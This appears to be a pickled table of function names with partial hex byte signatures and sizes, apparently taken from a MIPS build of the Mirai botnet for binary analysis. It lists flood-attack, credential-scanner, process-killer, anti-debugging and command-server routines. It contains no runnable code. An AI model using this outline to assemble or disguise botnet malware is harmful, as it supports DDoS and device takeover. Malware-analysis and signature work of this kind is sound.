(lp0
(S'_init'
p1
S'3c00279c91ac03ffafbc00bc0000003c00279c91889fe0'
p2
L140L
tp3
a(S'_ftext'
p4
S'3c00279c912099e027bd00afb11cb01891800000000000'
p5
L188L
tp6
a(S'frame_dummy'
p7
S'3c00279c9003ffafbf008f18998084800003f809000000009980'
p8
L128L
tp9
a(S'__start'
p10
S'0300040000003c00279c'
p11
L100L
tp12
a(S'attack_app_http'
p13
S'3c00279c'
p14
L9452L
tp15
a(S'attack_get_opt_str'
p16
S'30ff00080021000000a5008d00030000100000ff2400001003000000'
p17
L72L
tp18
a(S'attack_get_opt_ip'
p19
S'3c0003ffafbf00afbc8180c603f809002100004000'
p20
L108L
tp21
a(S'attack_get_opt_int'
p22
S'3c0003ffafbf00afbc8180c603f80900214020'
p23
L108L
tp24
a(S'attack_start'
p25
S'3c0003ffafbf00b428b220b018998100a8300093b34b03f809'
p26
L372L
tp27
a(S'attack_parse'
p28
S'3c0003ffafbe0000b544afb440afb33cb238b030a29021008c'
p29
L736L
tp30
a(S'attack_kill_all'
p31
S'3c0003ffafbf00afbc'
p32
L116L
tp33
a(S'add_attack'
p34
S'3c0003ffafbf00afb324b220b01899'
p35
L180L
tp36
a(S'attack_init'
p37
S'3c0003ffafbf00afbc8085a402c8f80900210021200900'
p38
L256L
tp39
a(S'attack_gre_eth'
p40
S'3c0003ffafbe0000b5afb460afb35cafb258afb154afb050afbc'
p41
L1824L
tp42
a(S'attack_gre_ip'
p43
S'3c0003ffafbe0000b55cafb458afb354afb250afb14cafb048afbc'
p44
L1636L
tp45
a(S'attack_tcp_stomp'
p46
S'3c0003'
p47
L2164L
tp48
a(S'attack_tcp_ack'
p49
S'3c0003'
p50
L1956L
tp51
a(S'attack_tcp_syn'
p52
S'3c0003'
p53
L1940L
tp54
a(S'attack_udp_plain'
p55
S'3c0003ffafbe0000b54cafb448afb344afb240afb13cb03899'
p56
L748L
tp57
a(S'attack_udp_generic'
p58
S'3c0003ffafbe0000b55cafb458afb354afb250afb14cafb048afbc'
p59
L1344L
tp60
a(S'attack_udp_vse'
p61
S'3c0003ffafbe0000b54cafb448afb344afb240afb13cb03899'
p62
L1184L
tp63
a(S'attack_udp_dns'
p64
S'3c0003f7bf08afb68008b374b270b16cafb068'
p65
L1912L
tp66
a(S'checksum_generic'
p67
S'100094'
p68
L88L
tp69
a(S'checksum_tcpudp'
p70
S'00008cff000594a2'
p71
L144L
tp72
a(S'mem_exists'
p73
S'0000004021000d808000430000001000158401e00800240024'
p74
L92L
tp75
a(S'killer_kill'
p76
S'3c000381440003002400'
p77
L32L
tp78
a(S'killer_kill_by_port'
p79
S'3c0003ddafbe2222b554afb450afb34cafb248afb144afb040afbc81002827a40203f80910'
p80
L2152L
tp81
a(S'killer_init'
p82
S'3c0003deafbf21afb7fcafb6f8afb5f4afb4'
p83
L2820L
tp84
a(S'anti_gdb_entry'
p85
S'3c000380'
p86
L32L
tp87
a(S'teardown_connection'
p88
S'3c0003'
p89
L100L
tp90
a(S'ensure_single_instance'
p91
S'3c0003'
p92
L548L
tp93
a(S'main'
p94
S'3c0003f988b76cafb668afb460afb35cafb258afb154afb050afbc'
p95
L3220L
tp96
a(S'resolve_cnc_addr'
p97
S'3c0003'
p98
L324L
tp99
a(S'rand_next'
p100
S'3c0003808a20871802c01c0000188c162406162802024310ad24201628e0'
p101
L92L
tp102
a(S'rand_str'
p103
S'3c0003'
p104
L164L
tp105
a(S'rand_alphastr'
p106
S'3c0003ffafb144afb040afbc8088240521a70024008c008c00c40800ace20000ace50cc8e7100025'
p107
L284L
tp108
a(S'rand_init'
p109
S'3c0003'
p110
L176L
tp111
a(S'resolv_skip_name'
p112
S'3c'
p113
L132L
tp114
a(S'resolv_entries_free'
p115
S'3c0003ffafbf00afbc0000009980402003f809000000000021b0182008bd00b018e008'
p116
L108L
tp117
a(S'resolv_domain_to_hostname'
p118
S'3c0003'
p119
L176L
tp120
a(S'resolv_lookup'
p121
S'3c0003ef18be10afb6d8b4d0b2c8c4bc'
p122
L1260L
tp123
a(S'consume_any_prompt'
p124
S'8c0024'
p125
L128L
tp126
a(S'can_consume'
p127
S'8c00a6280021e008'
p128
L24L
tp129
a(S'scanner_kill'
p130
S'3c0003818c03002400'
p131
L32L
tp132
a(S'deobf'
p133
S'3c0003'
p134
L204L
tp135
a(S'add_auth_entry'
p136
S'3c0003'
p137
L332L
tp138
a(S'setup_connection'
p139
S'3c0003ffafbf00afb12cb028998100280221200900'
p140
L304L
tp141
a(S'recv_strip_null'
p142
S'3c0003ffafbf00afbc830003f809a000180d0228022010002400a20014000000a0a50014'
p143
L124L
tp144
a(S'scanner_init'
p145
S'3c0003f888be076cafb668afb460afb35cafb258afb154afb050afbc8103f809000040188f074dac430024'
p146
L7616L
tp147
a(S'table_retrieve_val'
p148
S'3c0003'
p149
L52L
tp150
a(S'toggle_obf'
p151
S'3c0003'
p152
L208L
tp153
a(S'table_lock_val'
p154
S'3c0003800027390884'
p155
L32L
tp156
a(S'table_unlock_val'
p157
S'3c0003800027390884'
p158
L32L
tp159
a(S'add_entry'
p160
S'3c0003ffafbf00b220b018998290000020008803f809a00000214028023003f8094098211084000002041300b324b220b018e008'
p161
L148L
tp162
a(S'table_init'
p163
S'3c0003ffafbf00afbc8080ba210003f80900'
p164
L1444L
tp165
a(S'util_strlen'
p166
S'1000001824008000'
p167
L36L
tp168
a(S'util_memcpy'
p169
S'100090a200a08401'
p170
L44L
tp171
a(S'util_strcpy'
p172
S'3c0003ffafbf00afbc1810000080c0060014'
p173
L100L
tp174
a(S'util_zero'
p175
S'100024'
p176
L36L
tp177
a(S'util_itoa'
p178
S'3c0003'
p179
L236L
tp180
a(S'util_memsearch'
p181
S'000000100080810014000000150801e00800250548218821ff25e008'
p182
L96L
tp183
a(S'util_atoi'
p184
S'24002400240080016921680010f924000000800100072400240014000000003f24001400001b070000402100005012e3ffff30ff001003'
p185
L364L
tp186
a(S'util_fdgets'
p187
S'3c0003ffafbf00afb324b220b0188000982180'
p188
L184L
tp189
a(S'util_local_addr'
p190
S'3c0003ffafbf00b030998103f809bc00'
p191
L228L
tp192
a(S'util_stristr'
p193
S'0018100000582162000000'
p194
L148L
tp195
a(S'util_strcmp'
p196
S'00000038240080000014'
p197
L132L
tp198
a(S'util_strncmp'
p199
S'000000402162000000'
p200
L148L
tp201
a(S'fcntl'
p202
S'3c0003'
p203
L136L
tp204
a(S'fcntl64'
p205
S'3c0003'
p206
L104L
tp207
a(S'chdir'
p208
S'3c0003ffafbf00afbcac009981002120090000500024'
p209
L88L
tp210
a(S'close'
p211
S'3c0003ffafbf00afbc'
p212
L84L
tp213
a(S'fork'
p214
S'3c0003ffafbf00afbca200009981002120090000500024'
p215
L84L
tp216
a(S'getpid'
p217
S'3c0003ffafbf00afbcb4000c9981002120090000500024'
p218
L84L
tp219
a(S'getppid'
p220
S'3c0003ffafbf00afbce0000c9981002120090000500024'
p221
L84L
tp222
a(S'ioctl'
p223
S'3c0003'
p224
L104L
tp225
a(S'kill'
p226
S'3c0003ffafbf00afbc'
p227
L88L
tp228
a(S'open'
p229
S'3c0003'
p230
L124L
tp231
a(S'creat'
p232
S'3c0003803003002403'
p233
L28L
tp234
a(S'prctl'
p235
S'3c0003'
p236
L120L
tp237
a(S'read'
p238
S'3c0003ffafbf00afbca3000c9981002120090000500024'
p239
L84L
tp240
a(S'readlink'
p241
S'3c0003ffafbf00afbcf5000c9981002120090000500024'
p242
L84L
tp243
a(S'select'
p244
S'3c0003'
p245
L120L
tp246
a(S'setsid'
p247
S'3c0003ffafbf00afbce2000c9981002120090000500024'
p248
L84L
tp249
a(S'sigprocmask'
p250
S'3c0003ffafbf00afbc'
p251
L148L
tp252
a(S'time'
p253
S'3c0003ffafbf00afbcad000c9981002120090000500024'
p254
L84L
tp255
a(S'unlink'
p256
S'3c0003ffafbf00afbcaa00009981002120090000500024'
p257
L84L
tp258
a(S'write'
p259
S'3c0003ffafbf00afbca4009981002120090000500024'
p260
L84L
tp261
a(S'closedir'
p262
S'3c0003ffafbf00b230b028808e00240027b318'
p263
L292L
tp264
a(S'opendir'
p265
S'3c0003ffbf00afb0b0bc800003f8090004000021004e009021402003f809a500'
p266
L408L
tp267
a(S'readdir'
p268
S'3c0003ffafbf00b02899818f3000f809a400'
p269
L256L
tp270
a(S'__errno_location'
p271
S'3c000380e00800'
p272
L24L
tp273
a(S'clock'
p274
S'3c0003ffafbf00'
p275
L108L
tp276
a(S'memset'
p277
S'280015801000002800402308030003c885008821c806000038003801302400ac85f814'
p278
L144L
tp279
a(S'memmove'
p280
S'3c0003ffafbf00afbc10002b800018'
p281
L816L
tp282
a(S'strcpy'
p283
S'00'
p284
L36L
tp285
a(S'inet_addr'
p286
S'3c0003'
p287
L72L
tp288
a(S'accept'
p289
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p290
L84L
tp291
a(S'bind'
p292
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p293
L84L
tp294
a(S'connect'
p295
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p296
L84L
tp297
a(S'getsockname'
p298
S'3c0003ffafbf00afbc10009981002120090000500024'
p299
L84L
tp300
a(S'getsockopt'
p301
S'3c0003'
p302
L120L
tp303
a(S'listen'
p304
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p305
L84L
tp306
a(S'recv'
p307
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p308
L84L
tp309
a(S'recvfrom'
p310
S'3c0003'
p311
L128L
tp312
a(S'send'
p313
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p314
L84L
tp315
a(S'sendto'
p316
S'3c0003'
p317
L128L
tp318
a(S'setsockopt'
p319
S'3c0003'
p320
L120L
tp321
a(S'socket'
p322
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p323
L84L
tp324
a(S'raise'
p325
S'3c0003ffafbf00afbc8000002009800228'
p326
L76L
tp327
a(S'sigaddset'
p328
S'3c0003ffafbf00'
p329
L104L
tp330
a(S'sigemptyset'
p331
S'3c0003ffafbf00'
p332
L60L
tp333
a(S'signal'
p334
S'3c0003feafbf01afbc'
p335
L252L
tp336
a(S'__sigismember'
p337
S'24'
p338
L40L
tp339
a(S'__sigaddset'
p340
S'24'
p341
L44L
tp342
a(S'__sigdelset'
p343
S'24'
p344
L48L
tp345
a(S'malloc'
p346
S'3c0003ffafbf00b020802c'
p347
L492L
tp348
a(S'calloc'
p349
S'3c0003'
p350
L180L
tp351
a(S'free'
p352
S'3c0003'
p353
L396L
tp354
a(S'realloc'
p355
S'3c0003ffafbf00afb324b220b018a098210000200900000000000514002400'
p356
L472L
tp357
a(S'__heap_alloc'
p358
S'8c'
p359
L188L
tp360
a(S'__heap_alloc_at'
p361
S'8c0024008c000000102400a82b000000150000'
p362
L184L
tp363
a(S'__heap_link_free_area'
p364
S'aca700c0aca6001000acc5048500e0020000000000'
p365
L44L
tp366
a(S'__heap_link_free_area_after'
p367
S'100000001000acc5048500e0'
p368
L28L
tp369
a(S'__heap_free'
p370
S'3c0003'
p371
L364L
tp372
a(S'atol'
p373
S'3c0003800021200800'
p374
L28L
tp375
a(S'strtol'
p376
S'3c00038103002400'
p377
L28L
tp378
a(S'_stdlib_strto_l'
p379
S'3c0003ffafbf00afb52cb428b220b018'
p380
L592L
tp381
a(S'exit'
p382
S'3c0003ffafbf00b02899818f0000f80900210000840900000000000000130003f8092021000000212009000000'
p383
L240L
tp384
a(S'sleep'
p385
S'3c0003'
p386
L564L
tp387
a(S'__uClibc_fini'
p388
S'3c0003ffafbf00afbc80800000230006008000002009000010ff10801824'
p389
L196L
tp390
a(S'__pthread_return_0'
p391
S'03000010'
p392
L8L
tp393
a(S'_pthread_cleanup_push_defer'
p394
S'03000000'
p395
L8L
tp396
a(S'__check_one_fd'
p397
S'3c0003'
p398
L136L
tp399
a(S'__uClibc_init'
p400
S'3c0003ffafbf008f008cb4000000020181008f'
p401
L140L
tp402
a(S'__uClibc_main'
p403
S'3c0003ffbf00b39cafb298afb194afb090afbc10'
p404
L872L
tp405
a(S'sigaction'
p406
S'3c0003ffafb260afb15cafb058afbc80c0'
p407
L232L
tp408
a(S'__syscall_rt_sigaction'
p409
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p410
L84L
tp411
a(S'_exit'
p412
S'3c0003'
p413
L80L
tp414
a(S'fstat'
p415
S'3c0003ffbf00bc0000282410000c99810021200900005000100024'
p416
L140L
tp417
a(S'__getdents'
p418
S'3c0003'
p419
L200L
tp420
a(S'__getdents64'
p421
S'3c0003'
p422
L452L
tp423
a(S'getegid'
p424
S'3c0003ffafbf00afbcd2000c9981002120090000500024'
p425
L88L
tp426
a(S'geteuid'
p427
S'3c0003ffafbf00afbcd1000c9981002120090000500024'
p428
L88L
tp429
a(S'getgid'
p430
S'3c0003ffafbf00afbccf00009981002120090000500024'
p431
L84L
tp432
a(S'getuid'
p433
S'3c0003ffafbf00afbc'
p434
L84L
tp435
a(S'lseek64'
p436
S'3c0003ffafbe21b020c027bd308f00c7e0a210000cbd81100000212009000004ff000300000080100000c38f00c203e828b020e008'
p437
L168L
tp438
a(S'nanosleep'
p439
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p440
L84L
tp441
a(S'sbrk'
p442
S'3c0003'
p443
L144L
tp444
a(S'times'
p445
S'3c0003ffafbf00afbccb00009981002120090000500024'
p446
L84L
tp447
a(S'__xstat64_conv'
p448
S'3c0003'
p449
L288L
tp450
a(S'__xstat_conv'
p451
S'3c0003'
p452
L276L
tp453
a(S'memcpy'
p454
S'280015800003050011008828a800000011000038003801308c00aa008c008c008c002400ac88e089e48ae8ac'
p455
L308L
tp456
a(S'inet_aton'
p457
S'3c0003000058210a010029008000024000210030084000004021000524ff29011024840108c01043100018690046383008ff29044000140010000012100084016220400000000012002529050000140000000300240024000300acab0003000010'
p458
L244L
tp459
a(S'abort'
p460
S'3c0003'
p461
L428L
tp462
a(S'_dl_aux_init'
p463
S'3c000300'
p464
L44L
tp465
a(S'brk'
p466
S'3c0003ffafbf00'
p467
L112L
tp468
a(S'__do_global_ctors_aux'
p469
S'3c0003'
p470
L108L
tp471
a(S'_fini'
p472
S'3c0003ffafbc00bc0000003c000380000039202009000000000000e008'
p473
L92L
tp474
a.